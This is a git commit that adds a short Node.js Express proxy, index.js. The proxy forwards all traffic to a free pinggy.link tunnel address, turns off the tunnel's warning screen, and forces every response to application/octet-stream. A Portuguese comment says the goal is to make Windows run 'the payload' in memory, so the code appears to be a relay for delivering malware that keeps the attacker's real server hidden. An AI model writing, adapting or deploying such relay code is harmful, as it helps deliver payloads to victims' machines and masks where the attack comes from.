c4310a1e2a43cd7ebd77321b6c70d7614f7a9bec
pikachudoreddit-arch <pikachudoreddit@gmail.com>
2026-01-20 17:27:14 -0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,19 @@
+const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
+const app = express();
+
+const DESTINO = 'http://fyfyz-164-163-214-220.a.free.pinggy.link'; 
+
+app.use('/', createProxyMiddleware({ 
+    target: DESTINO, 
+    changeOrigin: true,
+    onProxyReq: (proxyReq) => {
+        proxyReq.setHeader('x-pinggy-no-screen', 'true');
+    },
+    onProxyRes: (proxyRes) => {
+        // Isso força o Windows a executar o payload na memória
+        proxyRes.headers['content-type'] = 'application/octet-stream'; 
+    }
+}));
+
+app.listen(process.env.PORT || 3000);
